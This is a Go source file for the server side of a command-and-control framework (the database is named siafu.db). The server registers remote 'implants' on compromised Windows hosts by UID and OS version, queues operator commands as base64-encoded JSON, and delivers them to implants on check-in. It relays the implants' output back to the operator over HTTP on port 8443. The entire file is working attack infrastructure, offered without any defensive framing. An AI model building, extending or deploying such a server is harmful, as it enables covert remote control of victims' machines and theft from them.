package main
import (
    "fmt"
	"log"
	"net/http"
	"net"
    "encoding/base64"
    "bytes"
    "encoding/json"
    "io/ioutil"
    "database/sql"
    "os"
    "path/filepath"
	"math/rand"
    "strconv"
    "strings"
    _ "github.com/mattn/go-sqlite3"
)

var err error
var serverIP string
var ip string
var cmdGroup string 
var cmdString string
var uid string
var dbDir string
var dbPath string
var uidToImplantIDMap = make(map[string]int)
var green = "\033[32m"
// ANSI escape code to reset text format
var reset = "\033[0m"
var red = "\033[31m"

type CommandQueueItem struct {
    Commands [][]string
    IDMask   int
}
type ConnectionLog struct {
    HostVersion string
    ID          int
}
var commandQueue []CommandQueueItem

type Command struct {
	Group    string `json:"Group"`
	String   string `json:"String"`
	Response string `json:"Response"`
}

var responseChan = make(chan string)

func main() {
    
    db, err := initDB()
    if err != nil {
        log.Fatal(err)
    }
    defer db.Close()

    // Start the server in a goroutine
    go startServer()

    select {}
}

func startServer() {
    http.HandleFunc("/implant", handleImplant)
    http.HandleFunc("/operator", handleOperator)
    http.HandleFunc("/info", handleServerCMDs)
    serverIP, err := getServerIP()
    if err != nil {
        log.Fatal("Error:", err)
    }
    // Get the server's IP address
    if serverIP == "" {
        log.Fatal("Failed to determine server IP address")
    }
    fmt.Printf("Server started at http://%s:8443\n", serverIP)
	// Server configuration
	server := http.Server{
		Addr:      ":8443",
	}

	// Serve
    err = server.ListenAndServe()
    defer server.Close()
}

func getServerIP() (string, error) {
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return "", fmt.Errorf("failed to retrieve interface addresses: %v", err)
    }

    for _, addr := range addrs {
        ipnet, ok := addr.(*net.IPNet)
        if !ok {
            continue
        }
        if ipnet.IP.IsGlobalUnicast() && ipnet.IP.To4() != nil {
			serverIP = ipnet.IP.String()
            return ipnet.IP.String(), nil
        }
    }
    return "", fmt.Errorf("unable to determine server IP address")
}


func handleImplant(w http.ResponseWriter, r *http.Request) {

    serializedData := r.Header.Get("Serialized-Data")
    uid = r.Header.Get("UID")
    
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // Receive response
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    var idMask int
	if uid != "" {
        // Check if the UID exists in the map
        var ok bool
        idMask, ok = uidToImplantIDMap[uid]
        if !ok {
            // UID not found in the map, call handleUID function
            handleUID(uid)
            return
        }

		if serializedData != "" {

            type Command struct {
                Group    string `json:"Group"`
                String   string `json:"String"`
                Response string `json:"Response"`
            }

            // Send the response to the operator
            responseChan <- string(serializedData)

			fmt.Fprintf(w, "Command received and processed successfully")

            } else {
                http.Error(w, "No serialized data found in the request", http.StatusBadRequest)
            }
        } else {
            http.Error(w, "No UID found in the request", http.StatusBadRequest)
            return
        }             

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Provide next command to implant
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        if len(commandQueue) != 0 && containsIDMask(idMask) {
            // Retrieve the first command item from the queue
            retrievedCMD := commandQueue[0]

            // Access the commands from retrievedCMD
            commands := retrievedCMD.Commands

            // Assuming you want the first command pair from the commands slice
            if len(commands) != 0 {
                cmdGroup := commands[0][0]
                cmdString := commands[0][1]

                // Create a Command struct for the next command
                nextCommand := Command{
                    Group:    cmdGroup,
                    String:   cmdString,
                    Response: "", 
                }

                // Marshal the Command struct to JSON
                jsonData, err := json.Marshal(nextCommand)
                if err != nil {
                    http.Error(w, "Failed to marshal JSON data", http.StatusInternalServerError)
                    return
                }

                // Base64 encode the JSON data
                base64Data := base64.StdEncoding.EncodeToString(jsonData)

                // Set response headers
                w.Header().Set("Content-Type", "text/plain")
                w.Header().Set("Content-Length", fmt.Sprint(len(base64Data)))
                // Write the response body
                fmt.Fprintf(w, "Serialized-Data: %s", base64Data)

                // Remove the processed command pair from the queue
                commandQueue = commandQueue[1:]
            }
    }
}

func handleOperator(w http.ResponseWriter, r *http.Request) {
    // Only allow POST requests
    // operatorID := r.Header.Get("Operator-ID")

    implantIDStr := r.Header.Get("Implant-ID")

    implantID, err := strconv.Atoi(implantIDStr)
    if err != nil {
        // Handle error if conversion fails
        http.Error(w, "Invalid Implant-ID", http.StatusBadRequest)
        return
    }

    if r.Method != http.MethodPost {
        http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
        return
    }
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Receive operator request        
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
    // Read request body
    requestBody, err := ioutil.ReadAll(r.Body)
    if err != nil {
        http.Error(w, "Failed to read request body", http.StatusInternalServerError)
        return
    }

    // Decode base64 data
    decodedData, err := base64.StdEncoding.DecodeString(string(requestBody))
    if err != nil {
        http.Error(w, "Failed to decode base64 data", http.StatusInternalServerError)
        return
    }

    // Unmarshal JSON data
    var command Command
    err = json.Unmarshal(decodedData, &command)
    if err != nil {
        http.Error(w, "Failed to unmarshal JSON data", http.StatusInternalServerError)
        return
    }

    // Add the command to the commandQueue
//    commandQueue = append(commandQueue, []string{command.Group, command.String}) // These work forsure
    addToCommandQueue([][]string{{command.Group, command.String}}, implantID)

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            // Respond to operator        
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        
    // Wait for the response from the implant
    response := <-responseChan

    // Write the response back to the client
    w.Header().Set("Content-Type", "text/plain")
    w.WriteHeader(http.StatusOK)
    fmt.Fprintf(w, "Data: %s", response)

}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Server Commands
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
var serverresp []string
func handleServerCMDs(w http.ResponseWriter, r *http.Request) {
    var receivestruct Command

    // Read the request body
    body, err := ioutil.ReadAll(r.Body)
    if err != nil {
        http.Error(w, fmt.Sprintf("Failed to read request body: %s", err), http.StatusBadRequest)
        return
    }

    // Base64 decode the request body
    decodedData, err := base64.StdEncoding.DecodeString(string(body))
    if err != nil {
        http.Error(w, fmt.Sprintf("Failed to decode base64 data: %s", err), http.StatusBadRequest)
        return
    }

    // Trim leading and trailing whitespace
    decodedData = bytes.TrimSpace(decodedData)
   
    err = json.Unmarshal(decodedData, &receivestruct)
    if err != nil {
        return
    }

    
    cmdgroup := receivestruct.Group
    cmdstring := receivestruct.String

    switch cmdgroup {
    case "implant":
        switch cmdstring {
        case "-l":
            listImplants()
        default:
            fmt.Print(red)
            fmt.Println("Invalid command for 'implant' group. Valid command is '-l' for listing implants.")
            fmt.Print(reset)
        }
    case "log":
        updateConnections()
    default:
        fmt.Print(red)
        fmt.Println("Invalid command group. Valid command groups are 'shell' and 'implant'.")
        fmt.Print(reset)
    }


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            // Respond to operator        
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    serverrespStr := strings.Join(serverresp, "")

    // Update the response structure with command response
    receivestruct.Response = serverrespStr


    jsonBytes, err := json.Marshal(receivestruct)
    if err != nil {
        fmt.Println("Error:", err)
        return
    }

    // Encode the JSON as base64
    response := base64.StdEncoding.EncodeToString(jsonBytes)

    w.Header().Set("Content-Type", "text/plain")
    w.WriteHeader(http.StatusOK)
    fmt.Fprintf(w, "Data: %s", response)
}

var vecconnectionlog []ConnectionLog

var prevLength = 0
func updateConnections() []string {
    // New connections are added to connectionlog in addToDB()
    serverresp = nil
    // If changes were made get the changes
    if len(vecconnectionlog) != prevLength {
        // If changes were made, format the log
        var formattedLog string
        for _, conn := range vecconnectionlog {
            formattedLog += fmt.Sprintf("Host Version: %s, ID: %d\n", conn.HostVersion, conn.ID)
        }
        // Append the formatted log to serverresp

        serverresp = append(serverresp, formattedLog)
        prevLength = len(vecconnectionlog)
        return serverresp
    }
    return serverresp // No changes
}

func listImplants() ([]string, error) {
    idMasks, versionNames, uids, err := getVersionNamesAndUIDs()
    if err != nil {
        return nil, err
    }

    for i := range idMasks {
        formattedImplant := fmt.Sprintf("-----------------------------\nID Mask: %s\nVersion Name: %s\nLast Check In: \nUID: %s\n-----------------------------\n", idMasks[i], versionNames[i], uids[i])
        serverresp = append(serverresp, formattedImplant)
    }

    return serverresp, nil // Return serverresp and nil indicating no error
}

func getVersionNamesAndUIDs() ([]string, []string, []string, error) {
    var idMasks []string
    var versionNames []string
    var uids []string

    // Collect all ID masks from the uidToImplantIDMap
    for _, idMask := range uidToImplantIDMap {
        idMasks = append(idMasks, strconv.Itoa(idMask))
    }

    // Open a connection to the database
    db, err := sql.Open("sqlite3", dbPath)
    if err != nil {
        return nil, nil, nil, fmt.Errorf("failed to open database connection: %s", err)
    }
    defer db.Close()

    // Query the database for versionName and uid associated with each ID mask
    for _, idMask := range idMasks {
        var versionName string
        var uid string

        // Execute the query
        row := db.QueryRow("SELECT versionName, uid FROM implants WHERE IDMask = ?", idMask)

        // Scan the query result into variables
        if err := row.Scan(&versionName, &uid); err != nil {
            if err == sql.ErrNoRows {
                // If no rows are found for the given ID mask, continue to the next one
                continue
            }
            return nil, nil, nil, fmt.Errorf("failed to scan row: %s", err)
        }

        // Append versionName and uid to the slices
        versionNames = append(versionNames, versionName)
        uids = append(uids, uid)
    }

    return idMasks, versionNames, uids, nil
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        // Helpers
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// Helper functions to convert uint32 to bytes and vice versa
func uint32ToBytes(n uint32) []byte {
    b := make([]byte, 4)
    b[0] = byte(n >> 24)
    b[1] = byte(n >> 16)
    b[2] = byte(n >> 8)
    b[3] = byte(n)
    return b
}

func bytesToUint32(b []byte) uint32 {
    return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
}

func containsIDMask(idMask int) bool {
    for _, item := range commandQueue {
        if item.IDMask == idMask {
            return true
        }
    }
    return false
}

func addToCommandQueue(commands [][]string, idMask int) {
    item := CommandQueueItem{
        Commands: commands,
        IDMask:   idMask,
    }
    commandQueue = append(commandQueue, item)
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            // Database
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
func initDB() (*sql.DB, error) {
    // Get the current working directory
    wd, err := os.Getwd()
    if err != nil {
        log.Fatal(err)
    }

    // Create the database directory if it doesn't exist
    dbDir := filepath.Join(wd, "database")
    if _, err := os.Stat(dbDir); os.IsNotExist(err) {
        err := os.MkdirAll(dbDir, 0755)
        if err != nil {
            log.Fatal(err)
        }
    }

    // Open SQLite database file
    dbPath = filepath.Join(dbDir, "siafu.db")
    db, err := sql.Open("sqlite3", dbPath)
    if err != nil {
        log.Fatal(err)
    }
    defer db.Close()

    // Create table if it does not exist
    _, err = db.Exec(`CREATE TABLE IF NOT EXISTS implants (
        uid TEXT PRIMARY KEY,
        versionName TEXT,
        IDMask INTEGER
    )`)
    if err != nil {
    log.Fatal(err)
    }

    return db, nil
}

func handleUID(uid string) {
	randUID, versionstr := parseUID(uid)
	if randUID == "" || versionstr == "" {
		fmt.Println("Invalid UID format")
		return
	}
	
    value, err := strconv.ParseUint(versionstr, 10, 32)
    if err != nil {
        fmt.Println("Error:", err)
        return
    }

    uintValue := uint32(value)
    hexString := fmt.Sprintf("0x%04X", uintValue)

    versionName := getVersionString(hexString)

    IDMask, err := isUIDInDB(uid, versionName)
	if err != nil {
		fmt.Println("Error checking UID:", err)
		return
	}

    // Update the map with the uid and implant-id mapping
    uidToImplantIDMap[uid] = IDMask
    
}

func parseUID(uid string) (string, string) {
    // Split the UID into its parts
    parts := strings.Split(uid, "-")
    if len(parts) != 2 {
        return "", ""
    }
    return parts[0], parts[1]
}

func isUIDInDB(uid, versionName string) (int, error) {
    // Open database connection
    db, err := sql.Open("sqlite3", dbPath)
    if err != nil {
        return 0, err
    }
    defer db.Close()

    var IDMask int
    // Query the database to check if UID exists
    err = db.QueryRow("SELECT IDMask FROM implants WHERE uid = ? AND versionName = ?", uid, versionName).Scan(&IDMask)
    switch {
    case err == sql.ErrNoRows:
        // UID not found, add it to the database
        IDMask, err := addToDB(uid, versionName)
        if err != nil {
            return 0, err
        }
        return IDMask, nil
    case err != nil:
        return 0, err // error occurred
    default:
        return IDMask, nil // UID found
    }
}

func generateIDMask() (int, error) {
    // Generate a random ID mask
    return rand.Intn(1000), nil
}

func addToDB(uid, versionName string) (int, error) {
    // Generate IDMask
    IDMask, err := generateIDMask()
    if err != nil {
        return 0, err
    }

    // Open database connection
    db, err := sql.Open("sqlite3", dbPath)
    if err != nil {
        return 0, err
    }
    defer db.Close()

    // Insert values into database
    _, err = db.Exec("INSERT INTO implants (uid, versionName, IDMask) VALUES (?, ?, ?)", uid, versionName, IDMask)
    if err != nil {
        return 0, err
    }

    fmt.Print(green)
    fmt.Println("New Connection")
    fmt.Println("Host Version:", versionName)
    fmt.Println("ID:", IDMask)

    vecconnectionlog = append(vecconnectionlog, ConnectionLog{
        HostVersion: versionName,
        ID:          IDMask,
    })

    fmt.Print(reset)
    return IDMask, nil
}

func getVersionString(versionStr string) string {
    version, err := strconv.ParseUint(versionStr[2:], 16, 32) // Remove "0x" prefix
    if err != nil {
        return "Invalid version string"
    }

    switch uint32(version) {
    case 0x0500:
        return "Windows-2000"
    case 0x0501:
        return "Windows-XP"
    case 0x0502:
        return "Windows-XP-Professional"
    case 0x0600:
        return "Windows-Vista"
    case 0x0601:
        return "Windows-7"
    case 0x0602:
        return "Windows-8"
    case 0x0603:
        return "Windows-8.1"
    case 0x0A00:
        return "Windows-10"
    case 0x0B00:
        return "Windows-11"
    case 0x0503:
        return "Windows-Server-2003-or-Windows-Home-Server"
    case 0x0604:
        return "Windows-Server-2008"
    case 0x0605:
        return "Windows-Server-2008-R2"
    case 0x0606:
        return "Windows-Server-2012"
    case 0x0607:
        return "Windows-Server-2012-R2"
    case 0x0A08:
        return "Windows-Server-2016"
    case 0x0A09:
        return "Windows-Server-2019"
    default:
        return "Unknown"
    }
}



